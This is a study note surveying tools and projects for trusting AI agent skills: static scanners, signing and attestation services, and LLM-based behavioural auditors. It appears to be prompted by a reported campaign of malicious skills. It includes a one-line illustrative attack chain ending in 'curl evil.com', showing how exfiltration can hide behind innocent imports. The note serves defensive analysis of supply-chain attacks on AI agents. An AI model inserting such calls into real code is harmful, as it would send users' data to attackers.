# Skill Trust Landscape — 2026-04 Snapshot

> 2026-04-26 study note

## Overview

The **agent skill trust layer** has exploded from theoretical discussion to real products in Q1 2026. At least 7 distinct approaches now exist, from browser-based scanners to full cryptographic attestation services.

The trigger: **ClawHavoc campaign** (341 malicious skills, 9000+ installations compromised) + Snyk finding 7.1% of ClawHub's 5700+ skills contain critical credential leaks.

## The Players

### Static Scanning

| Project | Approach | Status |
|---------|----------|--------|
| **SkillCheck** (Repello AI) | Browser-based scanner, upload zip → security score (0-100) + attack pattern detection | Free, production |
| **STSS** (kenhuangus) | Regex + Semgrep + import chain tracing | 6 stars, early |

### Cryptographic Signing & Attestation

| Project | Approach | Status |
|---------|----------|--------|
| **STSS** | Ed25519 signing + Merkle tree integrity verification | Early |
| **Skillpub** | Nostr keypair identity + web-of-trust + Cashu ecash payments | Active |
| **Gen Agent Trust Hub** | Norton/LifeLock parent → Vercel skills.sh integration | Announced 2026-02-17 |
| **Skills Hub** (Anaconda) | Enterprise 3-tier trust (curated / internal / external) | Hackathon prototype |
| **Tessl** (Guy Podjarny/Snyk founder) | Full lifecycle management with quality eval | 2000+ skills |

### Behavioral Audit

| Project | Approach | Status |
|---------|----------|--------|
| **STSS LLM Auditor** | Claude API behavioral analysis — detects mismatch between stated purpose and actual code | Opt-in |
| **Repello ARGUS** | Runtime security layer for GenAI systems | Production |

## Three-Layer Trust Model

The ecosystem won't converge on a single standard. It's stratifying:

1. **静态扫描** — Low cost, everyone can run. Catches obvious patterns (shell injection, credential reads, known malware signatures). But misses sophisticated attacks.
2. **签名/认证** — Requires PKI infrastructure. Answers "who published this?" with cryptographic proof. STSS and Skillpub are the only ones doing this properly.
3. **行为审计** — High cost (LLM API calls per scan). Catches behavioral mismatch ("says it's a Markdown formatter, actually exfiltrates data"). The nuclear option.

## Key Architecture Insight: STSS

STSS has the most complete design I've seen. The pipeline:

```
File ingestion → Regex scan → Semgrep scan → Hook detector (install scripts) 
→ Chain tracer (Python/JS/TS/Shell import graphs) → Caterpillar (auto-detect) 
→ LLM auditor (opt-in) → Registry adapter → Policy engine → Merkle tree → Ed25519 signing
```

**Anti-intuitive finding**: The chain tracer is crucial — it follows import graphs across files to detect obfuscated attacks (innocent `index.py` → `utils/helper.py` → `curl evil.com`). Traditional package scanners miss this because they analyze files in isolation.

## Marketplace Comparison (from Skillpub's analysis)

10+ skill directories now exist. Key gap analysis:

- **Nobody has autonomous agent purchasing** except dotMCP and Skillpub
- **Identity is almost universally GitHub-username-level** — one-week-old accounts can publish
- **No federation** — every platform except Skillpub is a single company, single database
- **Cross-format interop** between SKILL.md and MCP servers doesn't exist

## Relevance to [[agent-security]]

This validates our earlier observation (2026-04-09) that the industry is shifting from "framework war" to "trust war." The specifics:

- [[self-evolving-agent-landscape]]: Self-evolving agents that install skills need trust infrastructure even more than human-supervised ones
- OpenClaw's current VirusTotal-only scanning is the weakest link in the ecosystem
- STSS's approach (scan → sign → verify loop) could be integrated into ClawHub's publish pipeline

## Relation to [[agentskills-io-standard]]

The SKILL.md standard deliberately omits security (no signing, no sandboxing). This created the trust vacuum that 7+ projects are now trying to fill. The standard's simplicity was both its adoption advantage and its security liability.

## Open Questions

- Will Gen's enterprise backing make their trust hub the de facto standard? Or will it be too centralized?
- Can Skillpub's decentralized approach gain enough adoption to matter?
- Should we contribute to STSS given its comprehensive design but tiny community?
